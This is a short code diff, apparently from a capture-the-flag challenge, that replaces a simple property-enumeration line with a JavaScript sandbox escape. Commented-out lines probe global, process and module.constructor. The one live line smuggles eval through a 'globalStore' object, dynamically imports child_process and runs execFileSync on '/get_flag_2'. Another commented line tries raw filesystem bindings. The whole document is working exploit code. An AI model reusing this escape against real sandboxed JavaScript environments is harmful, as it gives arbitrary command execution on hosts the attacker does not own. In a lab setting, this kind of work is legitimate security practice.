@@ -1,3 +1,6 @@
-for (const p in this) console.log(p);
-
-1
+// console.log(global)
+// console.log(process)
+// console.log(module.constructor)
+// console.log(process.stdin)
+globalStore.eval = eval; globalStore.eval('import ("child_process").then((m)=>console.log(m.execFileSync("/get_flag_2", {encoding: "utf-8"})))');
+// console.log(process.binding('fs').open('/get_flag_2', 0, 0o666, function (s) { console.log(s) }))
